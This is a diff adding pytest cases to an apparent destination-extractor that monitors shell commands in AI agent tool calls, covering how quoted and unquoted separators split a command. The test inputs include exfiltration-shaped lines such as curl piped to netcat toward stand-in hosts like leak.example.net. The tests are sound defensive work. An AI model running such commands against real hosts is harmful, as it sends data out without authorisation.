@@ -191,6 +191,95 @@ def test_arguments_past_the_destination_are_not_destinations(command, expected):
     assert shell(command) == expected
 
 
+# ------------------------------------------------- separators inside quotes
+@pytest.mark.parametrize("command", [
+    # A separator inside an argument does not start a second command. These
+    # were the last large source of false positives on real logs: a *mention*
+    # of a curl command inside a quoted argument read as an invocation.
+    'git commit -m "fix; curl api.example.net"',
+    'echo "a; wget b.example.net"',
+    "python -c \"import os; print('curl x.example.net')\"",
+    "python -c 'run(\"curl x.example.net\")'",
+    'echo "a && wget b.example.net"',
+    'echo "a | wget b.example.net"',
+    'grep -rn "x; curl api.example.net" .',
+    "git commit -m \"don't; curl api.example.net\"",      # an apostrophe inside double quotes
+])
+def test_a_separator_inside_quotes_is_not_a_command(command):
+    assert shell(command) == set()
+
+
+def test_a_newline_separates_even_inside_quotes():
+    """Quoting is judged one line at a time, so a line break always separates.
+
+    A shell lets a quote span lines; this does not, on purpose. A tool call
+    carrying a heredoc or a script holds dozens of lines each with its own
+    quotes, and pairing a quote on one line with a quote twenty lines later
+    moves every segment boundary in between — measured on real logs, doing it
+    globally found *more* spurious hosts than the plain split. So the second
+    line here is read as its own command, which is the conservative reading.
+    """
+    assert shell('echo "line one\ncurl a.example.net"') == {"a.example.net"}
+    # And one line's broken quoting cannot change how the next is read.
+    assert shell("echo 'unclosed\ncurl a.example.net") == {"a.example.net"}
+    assert shell("echo 'unclosed\ngit commit -m \"fix; curl b.example.net\"") == set()
+
+
+@pytest.mark.parametrize("command,expected", [
+    # Outside quotes they are separators, exactly as before.
+    ("curl a.example.net; curl b.example.net", {"a.example.net", "b.example.net"}),
+    ("curl a.example.net && curl b.example.net", {"a.example.net", "b.example.net"}),
+    ("curl a.example.net | nc b.example.net 90", {"a.example.net", "b.example.net"}),
+    ("false || curl a.example.net", {"a.example.net"}),
+    ("curl a.example.net\ncurl b.example.net", {"a.example.net", "b.example.net"}),
+    # And a wrapper's quoted command is read by the depth-1 recursion, which is
+    # where the separators inside it get their meaning back.
+    ('bash -c "cd /tmp; curl x.example.net"', {"x.example.net"}),
+    ('bash -c "cd /tmp && curl f.example.net/x | nc g.example.net 90"',
+     {"f.example.net", "g.example.net"}),
+    ("ssh user@jump.example.net 'cd /t && curl inner.example.net/x'",
+     {"jump.example.net", "inner.example.net"}),
+])
+def test_a_separator_outside_quotes_still_splits(command, expected):
+    assert shell(command) == expected
+
+
+def test_unbalanced_quoting_falls_back_to_the_plain_split():
+    """A quote that never closes keeps exactly the old behaviour: more segments.
+
+    The structure cannot be trusted, and a malformed command line is the shape
+    an exfiltration attempt would take, so the conservative reading stays.
+    """
+    import re
+
+    from agent_certify.domains import _SEGMENTS, _split_segments
+
+    for command in ("curl 'x | nc y.example.net 90",
+                    'curl "x; curl z.example.net',
+                    "curl -x p.example.net:3128 'https://a.example/x",
+                    "don't; curl a.example.net",
+                    'echo " ; curl b.example.net'):
+        assert _split_segments(command) == _SEGMENTS.split(command), command
+    # The consequence, through extraction: the fragment after the separator is
+    # read as a command of its own, as it was before this.
+    assert shell("curl 'unterminated | nc leak.example.net 9000") == {"leak.example.net"}
+    assert shell("don't; curl a.example.net") == {"a.example.net"}
+    assert re.search(r"[|;&]", "curl 'x | nc y 90")              # the line really has a separator
+
+
+def test_the_split_is_one_pass_over_the_line():
+    """Quoted spans are consumed, so what is inside them is never a separator."""
+    from agent_certify.domains import _split_segments
+
+    assert _split_segments('git commit -m "fix; curl a.example.net"') == [
+        'git commit -m "fix; curl a.example.net"']
+    assert _split_segments("a; b && c | d || e") == ["a", " b ", " c ", " d ", " e"]
+    assert _split_segments("") == [""] and _split_segments("one") == ["one"]
+    assert _split_segments("'all quoted; here'") == ["'all quoted; here'"]
+    # An escaped quote inside double quotes does not end the span.
+    assert _split_segments('echo "a \\"b; c\\" d"') == ['echo "a \\"b; c\\" d"']
+
+
 def test_broken_quoting_never_hides_a_destination():
     """shlex raises on an unclosed quote; a whitespace split takes over.
 
@@ -473,7 +562,7 @@ _UNCHANGED = [
     ({"host": "db.internal.corp"}, {"db.internal.corp"}),
     ({"endpoint": {"host": "1.2.3.4", "port": 5432}}, {"1.2.3.4"}),
     ({"urls": ["https://a.example/x", "http://user:pw@B.example:8080/y"]}, {"a.example", "b.example"}),
-    ({"body": {"deep": {"nested": {"text": "see http://deep.example/z"}}}}, {"deep.example"}),
+    ({"payload": {"deep": {"nested": {"uri": "see http://deep.example/z"}}}}, {"deep.example"}),
     ({"base_url": "https://eu.example.com", "model": "x"}, {"eu.example.com"}),
     ({"pattern": "alibaba.com", "path": "notes.md"}, set()),
     ({"text": "contact us at example.com for details"}, set()),
